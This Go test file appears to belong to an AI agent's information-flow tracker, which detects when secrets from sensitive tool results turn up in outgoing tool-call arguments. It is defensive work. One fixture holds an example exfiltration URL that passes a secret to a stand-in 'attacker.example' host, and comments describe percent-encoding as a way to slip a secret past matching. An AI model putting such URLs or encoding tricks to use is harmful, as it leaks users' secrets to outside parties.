package agent

import (
	"encoding/json"
	"strings"
	"testing"

	"tenant/internal/model"
)

func TestInfoFlowTracker_MatchesLateAndShortSensitiveValues(t *testing.T) {
	label := []model.InfoFlowLabel{{Sensitivity: model.SensitivitySensitive, Provenance: model.ProvenanceMemory}}

	t.Run("late token remains covered by whole-result reverse match", func(t *testing.T) {
		tracker := newInfoFlowTracker()
		secret := "TEN311_LATE_SENTINEL_98fd"
		tracker.record(label, strings.Repeat("ordinaryword ", infoFlowFragmentsPerRead+20)+secret)
		args, _ := json.Marshal(map[string]any{"query": "send " + secret})
		if _, ok := tracker.match(args); !ok {
			t.Fatal("late sensitive token was not matched")
		}
	})

	t.Run("short exact value is not silently declassified", func(t *testing.T) {
		tracker := newInfoFlowTracker()
		tracker.record(label, "p9x")
		args, _ := json.Marshal(map[string]any{"url": "https://attacker.example/?v=p9x"})
		if _, ok := tracker.match(args); !ok {
			t.Fatal("short exact sensitive value was not matched")
		}
	})
}

// TEN-336: one malformed escape used to make both unescapers fail, so the
// whole form was dropped and an otherwise encoded secret went out unmatched.
func TestPercentDecodeKeepsMalformedEscapes(t *testing.T) {
	tests := []struct {
		in          string
		plusAsSpace bool
		want        string
	}{
		{in: "%54%45%zz%4E", want: "TE%zzN"},
		{in: "%54%4", want: "T%4"},
		{in: "%54%", want: "T%"},
		{in: "a+b%20c", plusAsSpace: true, want: "a b c"},
		{in: "a+b%20c", want: "a+b c"},
		{in: "plain", want: "plain"},
	}
	for _, tt := range tests {
		if got := percentDecode(tt.in, tt.plusAsSpace); got != tt.want {
			t.Errorf("percentDecode(%q, %v) = %q, want %q", tt.in, tt.plusAsSpace, got, tt.want)
		}
	}
}

// TEN-336: tracking stopped at 64 KiB while uncapped profiles saw the whole
// result, so a secret past that point was model-visible but untracked.
func TestInfoFlowTracker_TracksPastTheOld64KiBCap(t *testing.T) {
	label := []model.InfoFlowLabel{{Sensitivity: model.SensitivitySensitive, Provenance: model.ProvenanceLocalService}}
	secret := "TEN336_LATE_CHAT_SENTINEL_31c4"
	content := strings.Repeat("x", 100*1024) + "\n" + secret
	tracker := newInfoFlowTracker()
	tracker.record(label, content)
	args, _ := json.Marshal(map[string]any{"query": secret})
	if _, ok := tracker.match(args); !ok {
		t.Fatal("a secret past 64 KiB of a sensitive result was not tracked")
	}
}

// Every byte of a sensitive result the model can see is tracked: the context
// view holds it to the same bound the tracker records (TEN-336).
func TestContextViewHoldsSensitiveResultsToTheTrackedSize(t *testing.T) {
	big := strings.Repeat("y", infoFlowMaxResultBytes+100)

	body, note := contextView(big, 0, true)
	if len(body) != infoFlowMaxResultBytes || !strings.Contains(note, "sensitive tool result exceeded") {
		t.Fatalf("sensitive uncapped: body %d bytes, note %q; want %d bytes and a sensitive note", len(body), note, infoFlowMaxResultBytes)
	}
	if body, note := contextView(big, 0, false); body != big || note != "" {
		t.Fatalf("non-sensitive uncapped result was cut to %d bytes", len(body))
	}
	body, note = contextView(big, 100, true)
	if len(body) != 100*toolResultCharsPerToken || !strings.Contains(note, "100-token context cap") {
		t.Fatalf("a tighter token cap should win: body %d bytes, note %q", len(body), note)
	}
}

func TestInfoFlowTracker_QuotedByText(t *testing.T) {
	label := []model.InfoFlowLabel{{Sensitivity: model.SensitivitySensitive, Provenance: model.ProvenanceLocalFile}}
	tracker := newInfoFlowTracker()
	tracker.record(label, "api_token=TEN336_QUOTED_SENTINEL_77aa")
	tracker.record(nil, "a public page")
	if got := tracker.quotedByText("summary: the token is TEN336_QUOTED_SENTINEL_77aa"); len(got) != 1 || got[0].label != label[0] {
		t.Fatalf("quotedByText = %+v, want the local_file result", got)
	}
	if got := tracker.quotedByText("nothing sensitive here at all"); len(got) != 0 {
		t.Fatalf("unrelated text quoted %+v", got)
	}
}

func TestInfoFlowTracker_IgnoresUnlabelledResults(t *testing.T) {
	tracker := newInfoFlowTracker()
	tracker.record(nil, "TEN311_PUBLIC_SENTINEL")
	args, _ := json.Marshal(map[string]any{"query": "TEN311_PUBLIC_SENTINEL"})
	if _, ok := tracker.match(args); ok {
		t.Fatal("unlabelled result must not create sensitive provenance")
	}
}
